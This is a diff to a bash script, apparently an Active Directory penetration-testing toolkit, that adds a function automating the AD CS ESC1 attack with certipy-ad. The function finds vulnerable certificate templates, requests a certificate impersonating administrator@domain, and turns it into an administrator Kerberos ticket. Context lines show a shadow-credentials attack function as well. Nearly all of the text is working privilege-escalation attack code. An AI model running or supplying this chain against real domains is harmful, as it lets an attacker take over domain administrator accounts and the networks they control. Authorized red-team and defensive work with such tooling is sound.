@@ -568,3 +568,54 @@ perform_shadow_credentials() {
     python3 gettgtpkinit.py -cert-pfx ../$pywhisker_dir/$pfx_file -pfx-pass $pfx_password "$domain/$target_username" "$ccache_file"
     popd || exit 1
 }
+
+perform_adcsesc1() {
+    if [[ -z $username ]]; then
+        echo "Username is not set. Please set it before running"
+        return 1        
+    fi
+    if [[ -z $domain ]]; then
+        echo "Domain is not set. Please set it before running"
+        return 1        
+    fi
+    if [[ -z $password ]]; then
+        echo "Password is not set. Please set it before running"
+        return 1        
+    fi
+    if [[ -z $dc_ip ]]; then
+        echo "DC IP is not set. Please set it before running"
+        return 1        
+    fi
+    PATTERN="*Certipy.txt"
+    for file in $PATTERN; do
+        if [[ -e "$file" ]]; then
+            echo "$file already exists, skipping AD CS data collection."
+            ca_name=$(cat "$file" | grep 'CA Name' | awk -F': ' '{print $2}')
+            echo "Using CA Name: $ca_name"
+            if [[ -z $template_name ]]; then
+                template_name=$(cat "$file" | grep 'Template Name' | awk -F': ' '{print $2}')
+                echo "Using Template Name: $template_name"
+            fi
+            break
+        else
+            echo "No existing AD CS data found, proceeding with data collection."
+            certipy-ad find -u $username@$domain -p "$password" -dc-ip $dc_ip -vulnerable -enabled
+        fi
+    done
+    if [[ -z $ca_name ]]; then
+        echo "CA name is not set. Please set it before running"
+        return 1        
+    fi    
+    if [[ ! -f "adcs_esc1_req.cer.pfx" ]]; then
+        echo "No existing certificate request found, proceeding with request."
+        certipy-ad req -u $username@$domain -p "$password" -ca $ca_name -target $target_ip -template $template_name -upn administrator@$domain -out adcs_esc1_req.cer
+    else
+        echo "Certificate request already exists, skipping request generation."
+    fi
+    if [[ ! -f 'administrator.ccache' ]]; then
+        echo "No existing ccache file found, proceeding with ticket generation."
+        certipy-ad auth -pfx adcs_esc1_req.cer.pfx -dc-ip $dc_ip
+    else
+        echo "Ccache file already exists, skipping ticket generation."
+    fi
+}
